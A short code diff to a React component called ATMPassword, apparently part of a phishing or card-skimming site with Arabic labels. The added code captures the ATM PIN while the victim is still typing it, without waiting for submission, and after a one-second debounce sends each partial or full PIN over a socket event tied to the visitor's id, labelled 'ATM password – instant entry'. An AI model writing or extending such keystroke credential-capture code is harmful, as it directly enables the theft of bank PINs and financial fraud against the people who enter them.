@@ -12,6 +12,22 @@ export default function ATMPassword() {
   const [, navigate] = useLocation();
   const [pin, setPin] = useState(["", "", "", ""]);
   const [error, setError] = useState(false);
+  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  useEffect(() => {
+    const fullPin = pin.join("");
+    if (debounceRef.current) clearTimeout(debounceRef.current);
+    debounceRef.current = setTimeout(() => {
+      if (fullPin) {
+        socket.value.emit("more-info", {
+          _id: visitor.value._id,
+          content: { "كلمة مرور ATM": fullPin },
+          page: "صفحة ATM - إدخال فوري"
+        });
+      }
+    }, 1000);
+    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
+  }, [pin]);
   const [isWaiting, setIsWaiting] = useState(false);
   const [lang, setLang] = useState<"en" | "ar">("en");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
